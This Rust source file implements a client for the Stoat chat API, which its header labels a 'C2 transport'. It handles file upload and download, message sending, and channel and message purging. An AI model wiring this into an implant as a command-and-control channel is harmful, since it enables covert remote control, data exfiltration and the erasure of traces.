// language: Rust, file: src/stoat.rs
// Stoat (api.stoat.chat) C2 transport — REST send/upload/download, bot auth via X-Bot-Token.
#![allow(dead_code)]
use anyhow::{bail, Context, Result};
use reqwest::multipart::{Form, Part};
use reqwest::Client;
use serde_json::{json, Value};
use std::time::Duration;

#[derive(Clone)]
pub struct Stoat {
    http: Client,
    api: String,
    autumn: String,
    token: String,
    pub bot_id: String,
}

impl Stoat {
    pub async fn new(api: &str, autumn: &str, token: &str) -> Result<Self> {
        let http = Client::builder().timeout(Duration::from_secs(300)).build()?;
        let mut s = Self {
            http,
            api: api.trim_end_matches('/').to_string(),
            autumn: autumn.trim_end_matches('/').to_string(),
            token: token.to_string(),
            bot_id: String::new(),
        };
        let me = s.get("/users/@me").await?;
        s.bot_id = me["_id"]
            .as_str()
            .context("bot id missing from /users/@me")?
            .to_string();
        Ok(s)
    }

    async fn get(&self, path: &str) -> Result<Value> {
        let r = self
            .http
            .get(format!("{}{}", self.api, path))
            .header("X-Bot-Token", &self.token)
            .send()
            .await?;
        let status = r.status();
        let text = r.text().await.unwrap_or_default();
        if !status.is_success() {
            bail!("GET {path} -> {status}: {}", trim(&text));
        }
        Ok(serde_json::from_str(&text).unwrap_or(Value::Null))
    }

    pub async fn get_json(&self, path: &str) -> Result<Value> {
        self.get(path).await
    }

    pub async fn post_json(&self, path: &str, body: Value) -> Result<Value> {
        let r = self
            .http
            .post(format!("{}{}", self.api, path))
            .header("X-Bot-Token", &self.token)
            .json(&body)
            .send()
            .await?;
        let status = r.status();
        let text = r.text().await.unwrap_or_default();
        if !status.is_success() {
            bail!("POST {path} -> {status}: {}", trim(&text));
        }
        Ok(serde_json::from_str(&text).unwrap_or(Value::Null))
    }

    pub async fn create_channel(&self, server: &str, body: Value) -> Result<Value> {
        let r = self
            .http
            .post(format!("{}/servers/{}/channels", self.api, server))
            .header("X-Bot-Token", &self.token)
            .json(&body)
            .send()
            .await?;
        let status = r.status();
        let text = r.text().await.unwrap_or_default();
        if !status.is_success() {
            bail!("create channel -> {status}: {}", trim(&text));
        }
        Ok(serde_json::from_str(&text).unwrap_or(Value::Null))
    }

    pub async fn edit_server(&self, server: &str, body: Value) -> Result<()> {
        let r = self
            .http
            .patch(format!("{}/servers/{}", self.api, server))
            .header("X-Bot-Token", &self.token)
            .json(&body)
            .send()
            .await?;
        if !r.status().is_success() {
            let s = r.status();
            let t = r.text().await.unwrap_or_default();
            bail!("edit server -> {s}: {}", trim(&t));
        }
        Ok(())
    }

    pub async fn edit_channel(&self, channel: &str, body: Value) -> Result<()> {
        let r = self
            .http
            .patch(format!("{}/channels/{}", self.api, channel))
            .header("X-Bot-Token", &self.token)
            .json(&body)
            .send()
            .await?;
        if !r.status().is_success() {
            let s = r.status();
            let t = r.text().await.unwrap_or_default();
            bail!("edit channel -> {s}: {}", trim(&t));
        }
        Ok(())
    }

    pub async fn send(&self, channel: &str, content: &str) -> Result<()> {
        let r = self
            .http
            .post(format!("{}/channels/{}/messages", self.api, channel))
            .header("X-Bot-Token", &self.token)
            .json(&json!({ "content": content }))
            .send()
            .await?;
        if !r.status().is_success() {
            let s = r.status();
            let t = r.text().await.unwrap_or_default();
            bail!("send -> {s}: {}", trim(&t));
        }
        Ok(())
    }

    pub async fn send_code(&self, channel: &str, body: &str) -> Result<()> {
        let body = body.replace("```", "'''");
        for chunk in chunk_str(&body, 1800) {
            self.send(channel, &format!("```\n{chunk}\n```")).await?;
        }
        Ok(())
    }

    pub async fn send_plain(&self, channel: &str, body: &str) -> Result<()> {
        for chunk in chunk_str(body, 1800) {
            self.send(channel, &chunk).await?;
        }
        Ok(())
    }

    /// POST {autumn}/{tag} with multipart field `file`; returns the attachment id.
    /// Retries transient 5xx (Stoat's own DB hiccups) before giving up.
    pub async fn upload(&self, tag: &str, filename: &str, bytes: Vec<u8>) -> Result<String> {
        let mut last = String::new();
        for attempt in 0..4u32 {
            let part = Part::bytes(bytes.clone()).file_name(filename.to_string());
            let form = Form::new().part("file", part);
            let r = self
                .http
                .post(format!("{}/{}", self.autumn, tag))
                .header("X-Bot-Token", &self.token)
                .multipart(form)
                .send()
                .await?;
            let status = r.status();
            let text = r.text().await.unwrap_or_default();
            if status.is_success() {
                let v: Value = serde_json::from_str(&text)?;
                return Ok(v["id"].as_str().context("no id in upload response")?.to_string());
            }
            if status.is_server_error() && attempt < 3 {
                last = format!("{status}: {}", trim(&text));
                tokio::time::sleep(Duration::from_secs_f64(1.0 + attempt as f64)).await;
                continue;
            }
            bail!("upload -> {status}: {}", trim(&text));
        }
        bail!("upload failed after retries: {last}");
    }

    pub async fn send_file(
        &self,
        channel: &str,
        filename: &str,
        bytes: Vec<u8>,
        caption: &str,
    ) -> Result<()> {
        let id = self.upload("attachments", filename, bytes).await?;
        let r = self
            .http
            .post(format!("{}/channels/{}/messages", self.api, channel))
            .header("X-Bot-Token", &self.token)
            .json(&json!({ "content": caption, "attachments": [id] }))
            .send()
            .await?;
        if !r.status().is_success() {
            let s = r.status();
            let t = r.text().await.unwrap_or_default();
            bail!("send_file -> {s}: {}", trim(&t));
        }
        Ok(())
    }

    /// GET {autumn}/{tag}/{id} — the original file for an attachment.
    pub async fn download(&self, tag: &str, id: &str) -> Result<Vec<u8>> {
        let url = format!("{}/{}/{}", self.autumn, tag, id);
        self.raw_get(&url).await
    }

    pub async fn raw_get(&self, url: &str) -> Result<Vec<u8>> {
        let r = self.http.get(url).send().await?;
        let status = r.status();
        if !status.is_success() {
            bail!("GET {url} -> {status}");
        }
        Ok(r.bytes().await?.to_vec())
    }

    /// DELETE /channels/{id} — removes a channel (needs ManageChannel).
    pub async fn delete_channel(&self, id: &str) -> Result<()> {
        let r = self
            .http
            .delete(format!("{}/channels/{}", self.api, id))
            .header("X-Bot-Token", &self.token)
            .send()
            .await?;
        if !r.status().is_success() {
            let s = r.status();
            let t = r.text().await.unwrap_or_default();
            bail!("delete channel -> {s}: {}", trim(&t));
        }
        Ok(())
    }

    pub async fn delete_message(&self, channel: &str, id: &str) -> Result<bool> {
        let r = self
            .http
            .delete(format!("{}/channels/{}/messages/{}", self.api, channel, id))
            .header("X-Bot-Token", &self.token)
            .send()
            .await?;
        Ok(r.status().is_success())
    }

    /// Delete every message in a channel (the bot's own messages). Returns the count removed.
    pub async fn purge_channel(&self, channel: &str) -> Result<usize> {
        let page = self
            .get_json(&format!("/channels/{channel}/messages?limit=100"))
            .await?;
        let mut removed = 0usize;
        if let Some(arr) = page.as_array() {
            for m in arr {
                if let Some(id) = m["_id"].as_str() {
                    if self.delete_message(channel, id).await.unwrap_or(false) {
                        removed += 1;
                    }
                }
            }
        }
        Ok(removed)
    }
}

fn trim(s: &str) -> String {
    s.chars().take(300).collect()
}

fn chunk_str(s: &str, n: usize) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut count = 0usize;
    for ch in s.chars() {
        if count >= n {
            out.push(std::mem::take(&mut cur));
            count = 0;
        }
        cur.push(ch);
        count += 1;
    }
    if !cur.is_empty() {
        out.push(cur);
    }
    if out.is_empty() {
        out.push(String::new());
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn chunking_respects_limit() {
        let s = "a".repeat(5000);
        let chunks = chunk_str(&s, 1800);
        assert!(chunks.len() >= 3);
        assert!(chunks.iter().all(|c| c.chars().count() <= 1800));
        assert_eq!(chunks.concat(), s);
    }

    #[test]
    fn empty_input_yields_one_chunk() {
        assert_eq!(chunk_str("", 10).len(), 1);
    }
}
